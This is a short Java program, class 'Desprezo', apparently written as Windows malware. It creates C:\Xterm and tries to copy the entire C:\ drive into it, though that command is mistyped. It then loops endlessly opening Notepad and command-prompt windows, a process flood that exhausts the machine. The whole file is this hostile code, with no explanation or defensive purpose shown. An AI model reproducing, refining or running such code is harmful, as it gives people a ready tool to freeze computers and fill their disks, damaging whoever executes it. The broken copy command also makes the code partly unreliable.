

import java.util.*;
import java.io.*;

public class Desprezo{
	
	public static void main(String args[]){
		
		Runtime run = Runtime.getRuntime();
		
		// Runtime create
		
		String mkdir = "cmd /c mkdir C:\\Xterm";
		
		try {
			
			run.exec(mkdir);
			
			String copying = "cmd c/ xcopy -E C:\\ C:\\Xterm";
			
			try{
				
				run.exec(copying);
				
				while(true==true){
					
					String openNotepad = "cmd /c start notepad.exe";
					
					try{
						run.exec(openNotepad);
					}catch(Exception e){
						e.printStackTrace();
					}
					
					String openCmd = "cmd /c start cmd.exe";
					
					try{
						run.exec(openCmd);
					}
					catch(Exception e){
						e.printStackTrace();
					}
					
				}
				
			}catch(Exception e){
				e.printStackTrace();
			}
			
			
			
		} catch (IOException e) {
			e.printStackTrace();
		}
		
		//String copying = "xcopy C:\";
		
	}
	
}
